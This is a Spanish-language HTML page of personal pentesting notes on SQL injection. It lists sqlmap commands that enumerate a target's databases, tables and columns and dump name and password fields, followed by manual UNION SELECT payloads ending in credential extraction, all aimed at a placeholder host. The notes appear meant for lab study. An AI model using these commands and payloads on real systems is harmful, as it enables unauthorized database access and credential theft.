<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SQL Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SQL Injection</h1><br/><strong><span style="text-decoration:underline;">SQL MAP</span></strong><br /><br />En el siguiente comando explotaremos una vulnerabilidad de una web por la que mediante inyeccion de codigo en la URL podemos obtener consultas de la base de datos<br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;sqlmap&nbsp;-u&nbsp;&quot;http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plans&quot;&nbsp;--cookie&nbsp;&quot;PHPSESSID=cookie&nbsp;de&nbsp;sesion&quot;&nbsp;-dbs&nbsp;--batch&nbsp;--random-agent<br /></div></div><br /><br />Ahora nos sacara las bases de datos en el servidor y una vez que queramos explotar alguna hacemos lo siguiente<br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;sqlmap&nbsp;-u&nbsp;&quot;http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plans&quot;&nbsp;--cookie&nbsp;&quot;PHPSESSID=cookie&nbsp;de&nbsp;sesion&quot;&nbsp;-D&nbsp;baseejemplo&nbsp;--tables&nbsp;--batch&nbsp;--random-agent<br /></div></div><br /><br />Una vez vistas las tablas de esa base de datos, para ver los campos de esa tabla, tiramos el siguiente comando<br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;sqlmap&nbsp;-u&nbsp;&quot;http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plans&quot;&nbsp;--cookie&nbsp;&quot;PHPSESSID=cookie&nbsp;de&nbsp;sesion&quot;&nbsp;-D&nbsp;baseejemplo&nbsp;-T&nbsp;tablaejemplo&nbsp;--columns&nbsp;--batch&nbsp;--random-agent<br /></div></div><br /><br />Por ultimo para ver los registros de un campo hacemos lo siguiente<br /><br /><div class="codebox"><div class="codebox">┌──(kali@kali)-[~]<br />└─$&nbsp;sqlmap&nbsp;-u&nbsp;&quot;http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plans&quot;&nbsp;--cookie&nbsp;&quot;PHPSESSID=cookie&nbsp;de&nbsp;sesion&quot;&nbsp;-D&nbsp;baseejemplo&nbsp;-T&nbsp;tablaejemplo&nbsp;-C&nbsp;name,pass&nbsp;--dump&nbsp;--batch&nbsp;--random-agent<br /></div></div><br /><br /><strong><span style="text-decoration:underline;">EXPLOTACION MANUAL</span></strong><br /><br />Con la siguiente query podremos sabes la base de datos que se utiliza actualmente y un esquema de todas las bases de datos    <br /><br /><span style="color:#d50cbb;">http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plan union select 1,database(),schema_name,4 from information_schema.schemata-- -</span><br /><br />Con la siguiente query podremos ver las tablas de una base de datos<br /><br /><span style="color:#d50cbb;">http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plan union select 1,database(),table_name,4 from information_schema.tables where table_schema= “basededatos”-- -</span><br /><br />Con la siguiente query podremos ver los campos de una tabla<br /><br /><span style="color:#d50cbb;">http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plan union select 1,database(),column_name,4 from information_schema.columns where table_schema= “tabla” and table_name=&quot;basededatos&quot;-- -</span><br /><br />Ahora para sacar el usuario y contraseña de forma simple hacemos lo siguiente<br /><br /><span style="color:#d50cbb;">http://10.0.0.1/ejemplo/view.php?mod=admin&amp;view=repod&amp;id=plan union select 1,concat(usuario,0x3a,contraseña),3,4 from Basededatos.Tabla-- -</span><br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a></div>
</body>
</html>
